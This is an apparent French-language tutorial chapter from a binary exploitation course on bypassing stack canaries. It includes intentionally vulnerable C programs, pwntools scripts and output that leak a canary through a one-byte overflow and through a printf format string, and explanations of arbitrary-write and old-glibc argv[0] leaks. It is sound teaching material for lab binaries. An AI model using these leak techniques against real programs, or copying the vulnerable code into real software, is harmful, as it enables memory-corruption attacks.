---
title: Partie 11 - Contourner les canaris - exploitation d’un BO protégé (1/2)
date: 2026-04-28 10:00:00
categories: [Pwn, Introduction au pwn]
tags: [x86, pwn, linux]     # TAG names should always be lowercase
author: kabeche
toc: true
---

# Contourner les canaris : exploitation d’un BO protégé (1/2)

## Contournement

Nous avons vu comment fonctionne le canari en tant que **protection**. Désormais, analysons cette protection à travers le prisme d'un **attaquant**. Malheureusement, il n'est en général pas possible de deviner sa valeur car elle est [générée aléatoirement](https://elixir.bootlin.com/glibc/glibc-2.40/source/sysdeps/unix/sysv/linux/dl-osinfo.h#L26) via des valeurs aléatoires fournies par le noyau.

Voyons donc **quelles méthodes** permettent de la contourner. 

> Ce n'est pas le but **d'apprendre par cœur** ces différentes méthodes. Il est possible que vous ayez plus de mal à comprendre une méthode qu'une autre. Ce n'est pas grave. Il suffit de revenir à ce chapitre **plus tard** afin de le relire à tête reposée.  
{: .prompt-tip }

### 👀 Faire fuiter la valeur du canari

Une première méthode consiste à **afficher la valeur du canari**. Cette technique est utilisable lorsque le programme entre plusieurs fois dans la fonction vulnérable au *buffer overflow*. En effet, si nous arrivons à afficher la valeur du canari mais que nous ne sommes pas en mesure de l'utiliser car le programme a fini son exécution, cela ne sera pas exploitable en pratique.

Supposons que l'on soit dans le cas d'une **fonction** (ou bout de code) **vulnérable exécutée à plusieurs reprises**. Il existe plusieurs manières d'afficher le canari, considérons les cas les plus fréquents :

1. affichage de l'entrée utilisateur avec `printf` ;
2. contrôle d'une **chaîne de caractères formatée**.

#### Affichage de l'entrée utilisateur avec `printf`

Considérons le programme suivant :

```cpp
#include "stdio.h"
#include "string.h" // A ne pas oublier
#include "unistd.h" // A ne pas oublier

int main()
{
  while(1)
  {
    char prenom[256] = {0};
    read(0,prenom,500);

    if (!strncmp("Bye !",prenom,5))
      break;

    printf("Bonjour %s !\n",prenom);
  }
  return 0;
}

```

Pour le compiler : `clang -m32 -no-pie -fstack-protector  main_leak_1.c -o canaris_leak_1`.

- ⬇️ **Téléchargement** : [pwn-stack-canaris_leak_1.zip](https://drive.proton.me/urls/MYZ2P2NW08#j8A6gfzvEvuI)
- 🔎 **SHA256 & Analyse Virus Total** : [5d5ea4f5a866e835c3d53c25ea7e398b73559bfb246c299ab59d06d908127c92](https://www.virustotal.com/gui/file/5d5ea4f5a866e835c3d53c25ea7e398b73559bfb246c299ab59d06d908127c92) 
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-stack-canaris_leak_1 .
docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-stack-canaris_leak_1
```

> Nous utilisons `read` ici au lieu de `gets` afin de simplifier cet exemple car `gets` a la fâcheuse tendance de remplacer le dernier caractère lu par un octet nul 🙃.
{: .prompt-tip }

Ce que l'on cherche à faire est **d'afficher la valeur du canari** grâce à `printf`. Comment s'y prendre ?

> Il suffit de remplir le *buffer* `prenom` sans y insérer d'octet nul afin que `printf` affiche à la fois le contenu de `prenom` mais aussi la valeur du canari.
{: .prompt-info }

Bonne idée… mais il y a un problème : nous avons vu que l'octet de poids faible du canari est **toujours un octet nul**. Or, comme les *strings* en C doivent toujours être terminées par `\x00`, `printf` n'affichera **que les caractères avant de rencontrer un octet nul**.

Vous l'aurez compris, cet **octet nul** dans le canari permet justement d'éviter de **le faire fuiter** lorsqu'un `buffer` adjacent au canari est rempli.

> Vu que l'on peut écrire au-delà du *buffer*, il suffit **d'écraser l'octet nul du canari** avec un octet non nul ?
{: .prompt-info }

Exact ! Voici ce qui se passe selon que l’on écrase ou non l’octet nul du canari :

![](/assets/images/introduction_au_pwn/canari_affiche.png)

Essayons donc d'afficher la valeur du canari.

Habituellement, nous cherchons la taille du *payload* à partir de laquelle le programme plante. Mais ici, nous sommes dans une configuration différente : nous sommes dans une boucle `while`. Ainsi, tant que l'on reste dans la boucle `while`, la vérification du canari n'est **pas réalisée** donc il est tout à fait possible de le modifier **à condition de ne pas sortir de la boucle**.

Ça tombe bien, c'est ce que nous allons faire ! En tâtonnant et en s'aidant de **gdb** on constate qu'envoyer 256 octets permet de remplir le buffer `prenom` et qu'en envoyant **un octet de plus**, nous écrasons l'octet nul du canari. Ce qui est assez logique puisque le *buffer* `prenom` fait exactement 256 octets.

```python
from pwn import *

io = process("./canaris_leak_1")

payload = b"A" * 257

io.send(payload)
io.interactive()
```

> Dans ce script, nous utilisons `io.send` au lieu de `io.sendline` pour **ne pas envoyer un retour à la ligne** `\n` à chaque fois que l'on enverra notre *payload*. Cela nous permet de mieux contrôler ce que nous envoyons.
{: .prompt-tip }

En vérifiant dans gdb, on remarque que l'octet de poids faible du canari est bien modifié avec une valeur non nulle (ici `\x41` qui est l'encodage ASCII de `'A'`). 

Désormais, récupérons la valeur du canari à partir de ce qui est affiché par `printf`. Pour ce faire, voyons la tête qu'ont les données reçues en ouvrant un terminal **IPython** à la fin du script avec `IPython.embed()` à la place de `io.interactive()` (n'oubliez pas d'importer `IPython`) :

```python
In [1]: data = io.recv()  
  
In [2]: data  
Out[2]: b'Bonjour AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA#=\xae !\n'
```

> **Astuce pwntools** : `io.recv()` est utilisé afin de récupérer toutes les données affichées par le programme. Lorsque le challenge est à distance, comme les données ne sont pas échangées sur le réseau aussi vite qu'en local, `io.recv()` peut ne pas retourner toutes les données envoyées par le challenge. 
> 
> Auquel cas il serait plus judicieux d'utiliser une fonction comme `io.recvuntil()` ou [autre](https://github.com/Gallopsled/pwntools-tutorial/blob/master/tubes.md#receiving-data) pour s'assurer d'avoir tout reçu. 
{: .prompt-tip }

Ensuite, un peu de Python pour récupérer les 3 octets du canari (en évitant de récupérer le ` !\n`) et afficher la valeur finale du canari : 

```python
In [3]: canari_bytes = b"\x00"+data[265:265+3]
In [4]: canari = u32(canari_bytes)
In [5]: hex(canari)
Out[5]: '0xae3d2300'
```

> **Astuce pwntools** : `u32()` convertit des octets en un entier de 32 bits. `p32` fait l'inverse.
{: .prompt-tip }

L'*offset* `265` est constitué de la taille du bourrage (`257`) et de la taille de `"Bonjour "` (`8`) afin de récupérer directement les 3 derniers octets du canari. Voici ce que ça donne directement dans le script :

```python
from pwn import *

io = process("./canaris_leak_1")

payload = b"A" * 257

io.send(payload)

data = io.recv()

# On ajoute l'octet nul qui a été précédemment écrasé
canari_bytes = b"\x00"+data[265:265+3]
canari = u32(canari_bytes)
print("[+] Le canari vaut : ",hex(canari))

io.interactive()
```

Cette technique n'est pas seulement utile pour afficher le canari mais peut être utilisée pour **afficher d'autres valeurs sur la pile**. Cela nous sera très utile quand nous activerons l'**ASLR** 🫣. 

> Sauf mention contraire, nous allons faire l'hypothèse dans ce chapitre que **l'ASLR est activée**. Ainsi, n'oubliez pas de l'activer (`echo 2 > /proc/sys/kernel/randomize_va_space`) si ce n'est pas déjà le cas.
> 
> En effet, lorsque **l'ASLR est désactivée**, la valeur du canari peut rester identique d'une exécution à une autre pour les programmes **32 bits**. Cela **n'est pas le cas pour les programmes 64 bits** dont le canari varie dans tous les cas, indépendamment de l'activation ou non de l'**ASLR**. 
{: .prompt-warning }

#### Contrôle d'une chaîne de caractères formatée

Nous n'avons pas encore vu ensemble ce que sont les **chaînes de format** (*format strings* 🇬🇧) mais comme connaître le langage C est un prérequis de ce cours, j'imagine que vous savez de quoi il s'agit 😉.

Ce sont des chaînes de caractères comme celle que nous avions utilisées dans `printf("Bonjour %s !\n",prenom);`. Nous n'allons pas détailler l'exploitation d'un mauvais usage de *format strings* ici car nous nous y intéresserons [plus tard](/posts/introduction_au_pwn_partie_15/) dans le cours. Nous allons seulement voir comment cela peut nous permettre **d'afficher la valeur du canari**.

Prenons le programme suivant : 

```python
#include "stdio.h"
#include "unistd.h"

int main()
{
  char prenom[256] = {0};
  read(0,prenom,500);

  puts("Bonjour : ");
  printf(prenom); # format string vulnérable ici
  return 0;
}
```

Compilons-le en 64 bits cette fois-ci avec `clang -no-pie -fstack-protector main_leak_2.c -o canaris_leak_2`.

Pour le conteneur Docker :

- ⬇️ **Téléchargement** : [pwn-stack-canaris_leak_2.zip](https://drive.proton.me/urls/6THWNMQ7YM#XZ298CBabldM)
- 🔎 **SHA256 & Analyse Virus Total** : [e5c777a63e683d3c1d6d796849702a9176d1e62467c1171517a1df94d5dbfaec](https://www.virustotal.com/gui/file/e5c777a63e683d3c1d6d796849702a9176d1e62467c1171517a1df94d5dbfaec)
- ⚙️ **Construction et lancement du conteneur** :

```sh
docker build -t pwn-stack-canaris_leak_2 .
docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined pwn-stack-canaris_leak_2
```

Lançons le comme suit :

```
$ ./canaris_leak_2

%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p   

Bonjour : 
0x4052a0-(nil)-0x7ffff7ec35a4-0x7ffff7faab20-0x410-(nil)-(nil)-0x7fffffffe380-(nil)-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0xa-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-(nil)-0x7fffffffe570-0x61f9812fbcd8a00
```

La dernière valeur affichée `0x61f9812fbcd8a00` est le canari, on le reconnaît grâce à l'octet de poids faible qui est **nul**. Si vous n'avez pas compris comment cette entrée a permis d'afficher sa valeur, ce n'est pas grave car nous nous y pencherons plus tard ⏳. 

> Et comment tu as su le nombre de fois qu'il fallait utiliser `%p` pour afficher la valeur du canari ?
{: .prompt-info }

En tâtonnant et en utilisant **gdb** 🙃.

### 🫣 Ignorer le canari

Cette astuce ne concerne malheureusement **pas les exploitations** par *buffer overflow*. Par contre, dans le cas où :

- il est possible **d'écrire une valeur arbitraire** à n'importe quelle adresse ;
- l'adresse sur la pile où est stockée l'adresse de retour est **connue**.

Il est possible de réécrire l'adresse de retour **sans avoir à en découdre avec le canari**. De ce fait, ce n'est pas parce qu'un programme est protégé avec des canaris qu'il est difficile d'accéder à l'adresse de retour et la modifier.

### 🕵️‍♂️ Faire fuiter des informations grâce au canari

Dans d'anciennes versions de la **libc**, le message affiché lorsque le canari est écrasé n'est pas exactement le même que celui que nous avons de nos jours :

- **avant** la version **2.26** : `*** stack smashing detected ***: ./nom_prgrm terminated` ;
- **après** la version **2.26** : `*** stack smashing detected ***: terminated`.

> D'accord, auparavant le nom du programme était affiché mais en quoi est-ce important 🤔 ?
{: .prompt-info }

Pour comprendre en quoi cette petite différence est importante, il est nécessaire de jeter un œil aux différentes versions de la fonction `__fortify_fail_abort` dont l'ancien nom est `__fortify_fail` :

- version **2.26** de la fonction [ici](https://elixir.bootlin.com/glibc/glibc-2.26/source/debug/fortify_fail.c#L27) ;
- version **2.25** de la fonction [ici](https://elixir.bootlin.com/glibc/glibc-2.25/source/debug/fortify_fail.c#L26).

On remarque que dans l'ancienne version (2.25), le contenu de `__libc_argv[0]` est toujours affiché. Or `__libc_argv[0]` est le nom du programme courant, situé sur la pile. Ainsi, en écrasant le canari nous affichons le message `*** stack smashing detected ***: ./nom_prgrm terminated` mais en écrasant davantage de valeur sur la pile jusqu'à écraser `__libc_argv[0]`, il devient alors possible de **rediriger ce pointeur vers une adresse arbitraire**.

De cette manière, lorsque le message mentionnant l'écrasement du canari s'affiche, il affiche dans la foulée le contenu pointé par l'adresse arbitraire précédemment utilisée ! Désormais le contenu de `__libc_argv[0]` n'est pas automatiquement affiché ; cela n'est fait que si l'argument `need_backtrace` vaut `true`, ce qui n'est généralement pas le cas par défaut.

Pour les plus curieux, si vous souhaitez voir ce que cela donne concrètement dans un challenge, [en voici un exemple](https://0xswitch.fr/posts/leak-via-stack-smashing-protection).

## 📋 Synthèse

Nous avons exploré plusieurs méthodes pour contourner les **canaris** dans des scénarios de _stack buffer overflow_ :

- **Fuite de la valeur** : exploiter des débordements ou vulnérabilités ( `printf`, *format string*) pour lire le canari malgré son octet nul. Par exemple, écraser cet octet dans une boucle pour manipuler le contenu affiché par le programme.
- **Ignorer le canari** : modifier directement l’adresse de retour en cas de capacité d'écriture arbitraire.
- **Exploitation des anciennes versions de la glibc (avant 2.26)** : manipuler la pile pour détourner `__libc_argv[0]` et afficher des données via le message d’erreur généré par un écrasement du canari.